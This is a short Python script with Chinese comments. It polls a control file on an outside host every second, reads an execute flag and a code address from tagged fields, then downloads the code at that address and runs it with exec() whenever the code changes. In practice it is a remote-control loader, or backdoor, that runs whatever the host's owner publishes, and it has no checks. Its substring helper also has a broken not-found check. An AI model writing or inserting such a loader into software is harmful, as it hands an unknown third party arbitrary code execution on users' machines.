import requests
import time


def get_web(num_url):
    # 发送GET请求
    response = requests.get(num_url)
    # 检查请求是否成功
    if response.status_code == 200:
        # 获取响应内容
        content = response.text
        # print(content)
        return content
    else:
        print(f"Failed to retrieve the webpage. Status code: {response.status_code}")
        return None
def intercept(text, start_str, end_str):
    start_index = text.find(start_str) + len(start_str)
    end_index = text.find(end_str)

    if start_index != -1 and end_index != -1:
        result = text[start_index:end_index]
        # print(result)  # 输出: ,
        return result
    else:
        # print("Substring not found")
        return None


# 目标URL
url = 'https://yc.052024.xyz/Web/Background_detection.txt'
Current_version = '1.0'  # 当前版本
Code_executed = ''  # 已经执行代码

if __name__ == '__main__':
    while True:
        yc_kz_xx = get_web(url)
        yc_bb = intercept(yc_kz_xx, "【版本】", "【版本/】")
        yc_gx_Text = intercept(yc_kz_xx, "【更新内容】", "【更新内容/】")
        code_execute = intercept(yc_kz_xx, "【执行】", "【执行/】")
        code_address = intercept(yc_kz_xx, "【执行代码地址】", "【执行代码地址/】")

        if code_execute == "是":
            try:
                yc_code = get_web(code_address)
            except Exception as cw:
                yc_code = None
                print(cw)
            if yc_code is not None and yc_code != Code_executed:
                exec(yc_code)
                Code_executed = yc_code

        time.sleep(1)
